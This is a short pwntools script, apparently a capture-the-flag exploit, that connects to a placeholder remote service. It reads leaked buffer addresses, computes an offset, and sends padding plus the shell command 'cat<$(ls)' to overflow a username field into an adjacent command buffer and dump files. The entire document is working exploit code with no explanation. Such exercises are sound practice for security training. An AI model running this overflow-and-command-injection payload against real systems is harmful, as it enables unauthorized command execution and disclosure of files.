from pwn import *

host = "<Your host>"
port = ...

p = remote(host, port)

p.recvuntil(b"username at ")
username_addr = int(p.recvline().strip(), 16)
p.recvuntil(b"shell at ")
shell_addr = int(p.recvline().strip(), 16)
offset = shell_addr - username_addr
log.info(f"Offset: {offset}")
p.recvuntil(b"username: ")

payload = b"A" * offset + b"cat<$(ls)"
p.sendline(payload)

response = p.recvall(timeout=2).decode()
print(f"{response}")

p.close()